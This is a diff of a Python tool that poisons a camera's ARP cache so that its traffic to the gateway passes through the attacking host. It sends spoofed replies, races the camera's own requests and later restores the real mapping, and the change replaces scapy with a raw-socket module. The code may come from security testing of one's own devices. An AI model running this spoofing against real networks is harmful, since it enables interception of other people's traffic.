@@ -4,10 +4,8 @@ import threading
 import time
 from pathlib import Path
 
-from .netutil import ensure_libpcap, ipt, route_get
-
-ensure_libpcap()
-from scapy.all import ARP, Ether, get_if_hwaddr, sendp, sniff  # noqa: E402
+from . import rawnet
+from .netutil import ipt, route_get
 
 
 class OnPath:
@@ -58,32 +56,37 @@ class OnPath:
               f"{', camera-only ARP poison' if self.poison else ''}")
 
     def _arp_start(self):
-        me = get_if_hwaddr(self.iface)
-        cam_mac = self._mac(self.cam_ip)
-        gw_mac = self._mac(self.gateway)
-        lie = (Ether(dst=cam_mac, src=me)
-               / ARP(op=2, psrc=self.gateway, hwsrc=me, pdst=self.cam_ip,
-                     hwdst=cam_mac))
-        truth = (Ether(dst=cam_mac, src=gw_mac)
-                 / ARP(op=2, psrc=self.gateway, hwsrc=gw_mac,
-                       pdst=self.cam_ip, hwdst=cam_mac))
+        me = rawnet.mac_bytes(rawnet.iface_mac(self.iface))
+        cam_mac = rawnet.mac_bytes(self._mac(self.cam_ip))
+        gw_mac = rawnet.mac_bytes(self._mac(self.gateway))
+        # unicast to the camera only: "the gateway is at our MAC"
+        lie = rawnet.arp_reply(me, cam_mac, self.gateway, me,
+                               self.cam_ip, cam_mac)
+        truth = rawnet.arp_reply(gw_mac, cam_mac, self.gateway, gw_mac,
+                                 self.cam_ip, cam_mac)
+
+        def send(frame):
+            try:
+                with rawnet.open_raw(self.iface) as s:
+                    s.send(frame)
+            except OSError as e:     # link down across suspend/resume
+                print(f"[!] ARP send failed ({e})")
 
         def tick():
             while not self.stop.is_set():
-                sendp(lie, iface=self.iface, verbose=False)
+                send(lie)
                 self.stop.wait(1.0)
 
         def answer():
             # win the race when the camera asks for its gateway
             def cb(p):
-                if (ARP in p and p[ARP].op == 1 and p[ARP].psrc == self.cam_ip
-                        and p[ARP].pdst == self.gateway):
-                    sendp(lie, iface=self.iface, verbose=False)
+                if p.op == 1 and p.spa == self.cam_ip and p.tpa == self.gateway:
+                    send(lie)
             while not self.stop.is_set():
                 try:
-                    sniff(iface=self.iface, filter="arp", prn=cb, store=False,
-                          timeout=5, stop_filter=lambda _: self.stop.is_set())
-                except Exception as e:  # noqa: BLE001  (suspend/resume)
+                    rawnet.sniff(self.iface, rawnet.arp_filter(),
+                                 rawnet.parse_arp, cb, self.stop.is_set)
+                except OSError as e:  # suspend/resume
                     print(f"[!] ARP responder error ({e}); retrying")
                     self.stop.wait(2)
 
@@ -92,7 +95,7 @@ class OnPath:
 
         def restore():
             for _ in range(5):
-                sendp(truth, iface=self.iface, verbose=False)
+                send(truth)
                 time.sleep(0.3)
         self.undo.append(restore)
 
